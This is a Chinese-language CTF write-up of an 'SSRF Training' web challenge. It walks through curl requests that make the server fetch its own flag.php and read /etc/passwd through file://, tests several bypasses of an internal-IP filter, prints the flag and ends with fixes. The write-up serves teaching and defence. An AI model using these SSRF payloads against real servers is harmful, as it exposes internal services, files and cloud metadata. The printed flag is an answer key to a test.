---
title: "4-SSRF Training"
date: 2026-07-22
categories:
  - CTF
  - WEB
tags:
  - CTF
---

# 1. 题目分析

- **题目名称**：SSRF Training
- **题目类型**：WEB - SSRF（Server-Side Request Forgery）
- **技术栈**：Nginx (openresty) + PHP 5.6.40
- **题目结构**：同一 Web 服务提供两个难度等级的 SSRF 挑战

| 挑战等级 | 文件 | 请求方式 | IP 过滤 |
|---------|------|---------|--------|
| Simple | `index.php` | POST `url=` | ❌ 无过滤 |
| Interesting | `challenge.php` | GET `?url=` | ✅ `check_inner_ip()` 检测内网 IP |

# 2. 信息收集

## 2.1 获取 HTTP 响应头

```bash
curl -s -i "http://TARGET/"
```

```
HTTP/2 200
server: openresty          ← Nginx 系 Web 服务器
x-powered-by: PHP/5.6.40   ← PHP 5.6 后端
content-type: text/html; charset=UTF-8
```

**分析**：
- `Server: openresty` → Nginx + Lua，常见于 CTF Docker 环境
- `X-Powered-By: PHP/5.6.40` → 后端为 PHP 5.6（较老版本，可能有 parse_url 差异）
- 无 Session Cookie → 无状态交互

## 2.2 页面源码分析

```html
<!-- 关键元素 -->
<a href="challenge.php"> intersting challenge</a>

<!-- 提示信息（以 NES 游戏风格 badge 展示） -->
<span class="is-warning">flag.php</span>         ← flag 在 flag.php
<span class="is-warning">302.php post url</span>  ← 302 重定向辅助文件

<!-- SSRF 表单（Simple Challenge） -->
<form method="post">
    <input name="url" class="nes-input" placeholder="input url">
    <button type="submit">Submit</button>
</form>
```

**线索提取**：
1. `flag.php` — flag 所在文件，需要从服务器本地访问
2. `302.php post url` — 302 重定向辅助，POST 方式传递 `url` 参数
3. `challenge.php` — 带 IP 过滤的进阶挑战
4. POST 表单 `name="url"` — 简单版 SSRF 注入点

## 2.3 枚举关键文件

```bash
# 检查各文件的响应
curl -s -i "http://TARGET/challenge.php"  # → 200，显示 PHP 源码
curl -s -i "http://TARGET/302.php"        # → 200，空响应体（GET 方法）
curl -s -X POST "http://TARGET/302.php" -d "url=http://127.0.0.1/flag.php"
                                          # → 302，Location: http://127.0.0.1/flag.php
curl -s -i "http://TARGET/flag.php"       # → 200，空响应体（需从本地访问）
```

# 3. 漏洞分析

## 3.1 推理链

```
观察到的线索
    ↓
页面有 POST 表单 + url 参数名 → 可能为 SSRF
    ↓
提交公网 URL → 返回目标页面内容 → 确认 SSRF
    ↓
页面 badge 提示 "flag.php" → flag 可能在 flag.php
    ↓
尝试直接访问 flag.php → 空响应（需要本地访问）
    ↓
假设：flag.php 检查请求来源，仅允许 localhost
    ↓
验证：SSRF 请求 http://127.0.0.1/flag.php → 返回 flag ✅
    ↓
结论：经典 SSRF 绕过 IP 限制访问内网资源
```

## 3.2 Simple Challenge 漏洞原理

**index.php（首页表单）**没有实现任何 IP 过滤，直接将用户输入的 URL 传递给 cURL 请求：

```
用户请求流程：
┌──────────────────────────────────────────────────────┐
│ POST / HTTP/1.1                                      │
│ Content-Type: application/x-www-form-urlencoded       │
│                                                      │
│ url=http://127.0.0.1/flag.php                        │
│                                                      │
│   ↓ PHP 后端处理                                     │
│                                                      │
│ curl_setopt($ch, CURLOPT_URL,                        │
│   "http://127.0.0.1/flag.php");                      │
│ $output = curl_exec($ch);                            │
│                                                      │
│   ↓ 服务器以本地身份请求 flag.php                     │
│                                                      │
│ flag.php 返回: n1book{ug9thaevi2JoobaiLiiLah4zae6fie4r} │
└──────────────────────────────────────────────────────┘
```

**支持的协议**：
| 协议 | 可用性 | 说明 |
|------|--------|------|
| `http://` | ✅ | 发起 HTTP GET 请求 |
| `https://` | ✅ | 发起 HTTPS GET 请求 |
| `file://` | ✅ | 读取本地文件（如 `/etc/passwd`） |

## 3.3 Challenge.php 源码分析

challenge.php 实现了内网 IP 过滤函数 `check_inner_ip()`：

```php
function check_inner_ip($url) {
    // 1. URL 格式检查：只允许 http:// 或 https:// 开头
    $match_result = preg_match('/^(http|https)?:\/\/.*(\/)?.*$/', $url);
    if (!$match_result) {
        die('url fomat error');
    }

    // 2. 解析 URL 获取 hostname
    $url_parse = parse_url($url);
    $hostname = $url_parse['host'];

    // 3. DNS 解析 hostname → IP
    $ip = gethostbyname($hostname);
    $int_ip = ip2long($ip);

    // 4. 检查是否为私有 IP 段
    return ip2long('127.0.0.0')>>24 == $int_ip>>24     // 127.0.0.0/8
        || ip2long('10.0.0.0')>>24 == $int_ip>>24      // 10.0.0.0/8
        || ip2long('172.16.0.0')>>20 == $int_ip>>20    // 172.16.0.0/12
        || ip2long('192.168.0.0')>>16 == $int_ip>>16;  // 192.168.0.0/16
}

function safe_request_url($url) {
    if (check_inner_ip($url)) {
        echo $url.' is inner ip';  // 拦截内网 IP
    } else {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        $result_info = curl_getinfo($ch);

        // 关键：跟随 302 重定向
        if ($result_info['redirect_url']) {
            safe_request_url($result_info['redirect_url']); // 递归调用
        }

        curl_close($ch);
        var_dump($output);
    }
}
```

### 防护机制分析

```
check_inner_ip() 防护链：
┌──────────────┐     ┌─────────────┐     ┌──────────────┐     ┌──────────────┐
│ 1. 正则匹配   │ →  │ 2. parse_url│ →  │ 3. gethost   │ →  │ 4. ip2long   │
│ /^(http\|https│     │ 解析 host   │     │ byname解析IP │     │ 检查私有网段  │
│ )?:\/\/.*$/  │     │             │     │             │     │              │
└──────────────┘     └─────────────┘     └──────────────┘     └──────────────┘
      ↓                      ↓                    ↓                    ↓
  仅允许http(s)         获取hostname          解析为IPv4          检查127/10/
  协议头                (如127.0.0.1)        地址                172.16/192.168
```

### 漏洞点识别

| 漏洞点 | 说明 |
|--------|------|
| **正则过于宽松** | `(http\|https)?` 中 `?` 使协议名可选，仅要求 `://` 前缀 |
| **仅检查 IPv4** | `ip2long()` 只处理 IPv4，IPv6 地址（如 `[::1]`）返回 `false`，绕过所有检测 |
| **302 重定向递归** | `safe_request_url` 跟随重定向，但递归调用也会执行 `check_inner_ip`，防止简单的重定向绕过 |
| **无 file:// 支持** | 正则要求 `://` 前缀，`file:///etc/passwd` 被拦截（"url fomat error"） |

## 3.4 302.php 分析

302.php 是一个**重定向转发器**：

```
GET /302.php          → 200 OK（空响应体）
POST /302.php url=X   → 302 Found, Location: X
```

作用：将任意 POST 参数 `url` 的值作为 `Location` 头返回，触发 302 重定向。

`challenge.php` 中的 `safe_request_url` 使用 cURL 发起 **GET** 请求，而 302.php 仅在 **POST** 时返回重定向。因此 challenge.php 无法直接利用 302.php 进行重定向绕过（会返回 200 空响应）。

## 3.5 尝试过但失败的路径

| 尝试 | 预期 | 实际结果 | 排除的漏洞 |
|------|------|---------|-----------|
| `?url=file:///etc/passwd` | 读取本地文件 | `url fomat error` | `file://` 协议被正则拒绝 |
| `?url=http://127.0.0.1/flag.php` | 访问 flag | `is inner ip` | 直接 127.0.0.1 被拦截 |
| `?url=http://2130706433/flag.php` | 十进制 IP 绕过 | `is inner ip` | `gethostbyname` 正确解析十进制 IP |
| `?url=http://127.1/flag.php` | 短 IP 绕过 | `is inner ip` | `gethostbyname` 正确解析 127.1=127.0.0.1 |
| `?url=http://localhost/flag.php` | localhost 绕过 | `is inner ip` | `gethostbyname('localhost')` = 127.0.0.1 |
| `?url=http://example.com@127.0.0.1/flag.php` | @ 符号混淆 | `is inner ip` | parse_url 正确提取 host 为 127.0.0.1 |
| `?url=http://0/flag.php` | 0 绕过 IP 检查 | 连接至 10.42.3.246（其他容器） | 容器网络中有多个服务，flag 不在该主机 |

# 4. 漏洞利用

## 4.1 Simple Challenge — 获取 Flag（主要方法）

```bash
curl -s -X POST "http://TARGET/" \
  -d "url=http://127.0.0.1/flag.php"
```

**返回**：
```
n1book{ug9thaevi2JoobaiLiiLah4zae6fie4r}
```

## 4.2 附加利用：读取系统文件

```bash
curl -s -X POST "http://TARGET/" \
  -d "url=file:///etc/passwd"
```

**返回**：
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

## 4.3 Challenge.php IPv6 绕过（理论可行）

```bash
# IPv6 localhost 绕过 ip2long 检测
curl -s "http://TARGET/challenge.php?url=http://[::1]/flag.php"
# → 绕过 IP 检查 ✅，但 flag 未绑定 IPv6（返回空）

# 通过 Simple Challenge 测试 IPv6
curl -s -X POST "http://TARGET/" -d "url=http://[::1]/flag.php"
# → 也返回空（确认 flag.php 仅监听 IPv4 127.0.0.1）
```

## 4.4 302 重定向链（挑战设计意图）

challenge.php 的 `safe_request_url()` 设计了 302 重定向跟随功能，理论上通过以下链实现绕过：

```
Step 1: POST /302.php  (外部)
        url=http://127.0.0.1/flag.php
        → 302.php "记录" 重定向目标（但 PHP 无状态，无法持久化）

Step 2: GET /challenge.php?url=http://TARGET/302.php
        → challenge.php 的 cURL GET 请求 302.php
        → 302.php GET 返回 200 空响应（无重定向）
        → 绕过失败

问题：302.php 仅 POST 返回重定向，challenge.php 只能发 GET
```

# 5. Flag

```
n1book{ug9thaevi2JoobaiLiiLah4zae6fie4r}
```

**获取方式**：通过 SSRF 以服务器本地身份（`http://127.0.0.1`）请求 `flag.php`

# 6. 知识点总结

## 6.1 SSRF（Server-Side Request Forgery）

- **定义**：攻击者利用服务器端发起请求的功能，构造恶意请求访问内网资源
- **危害**：
  - 读取内网敏感文件（`file:///etc/passwd`）
  - 访问内网服务（内网 API、数据库）
  - 端口扫描内网
  - 攻击云元数据服务（`http://169.254.169.254/`）

## 6.2 绕过 SSRF 内网 IP 限制的常见方法

| 方法 | 示例 | 本题状态 |
|------|------|---------|
| 十进制 IP | `http://2130706433/` | ❌ 被拦截 |
| 短 IP | `http://127.1/` | ❌ 被拦截 |
| IPv6 | `http://[::1]/` | ✅ 绕过检测（但 flag 不在此） |
| DNS 重绑定 | `http://127.0.0.1.nip.io/` | ❌ gethostbyname 解析后检测 |
| 302 重定向 | 外部 URL → 302 → 内网 | 本题设计但受限于 GET/POST |
| URL 解析差异 | `http://foo@127.0.0.1/` | ❌ parse_url 正确提取 |

## 6.3 修复建议

1. **白名单域名/IP**：只允许请求白名单中的目标
2. **禁用危险协议**：不允许 `file://`、`gopher://`、`dict://` 等
3. **禁用重定向跟随**：`CURLOPT_FOLLOWLOCATION` 设为 false
4. **检查 IPv6**：不仅要检查 IPv4 私有地址，也要检查 IPv6（`::1`、`fe80::/10`）
5. **网络隔离**：Web 服务不应能访问内网敏感资源

# 7. 解题链路总结图

```
获取页面 → HTTP 响应头分析 → 确认 PHP 5.6 + OpenResty
    │
    ├─ 页面源码审计
    │   ├─ 发现 POST 表单 (url 参数) → SSRF 入口
    │   ├─ 发现 flag.php 提示
    │   ├─ 发现 challenge.php 链接
    │   └─ 发现 302.php post url 提示
    │
    ├─ Simple Challenge (index.php)
    │   │
    │   ├─ POST url=http://127.0.0.1/flag.php
    │   │   → ✅ 获取 flag!
    │   │   → n1book{ug9thaevi2JoobaiLiiLah4zae6fie4r}
    │   │
    │   └─ POST url=file:///etc/passwd
    │       → ✅ 确认 file:// 协议可用
    │
    └─ Interesting Challenge (challenge.php) 源码审计
        │
        ├─ 分析 check_inner_ip() 过滤逻辑
        │   ├─ 正则: 仅 http(s):// 开头
        │   ├─ parse_url: 提取 hostname
        │   ├─ gethostbyname: DNS 解析为 IPv4
        │   └─ ip2long: 检查私有 IP 段
        │
        ├─ 尝试绕过:
        │   ├─ file:// 协议 → 正则拒绝
        │   ├─ 十进制/短IP → ip2long 检测
        │   ├─ localhost → gethostbyname=127.0.0.1 被检测
        │   ├─ @ 符号混淆 → parse_url 正确解析
        │   ├─ 302 redirect (via 302.php) → GET/POST 不匹配
        │   └─ IPv6 [::1] → ✅ 绕过 ip2long（但 flag 仅 IPv4）
        │
        └─ 结论: Simple Challenge 是主要解法
```
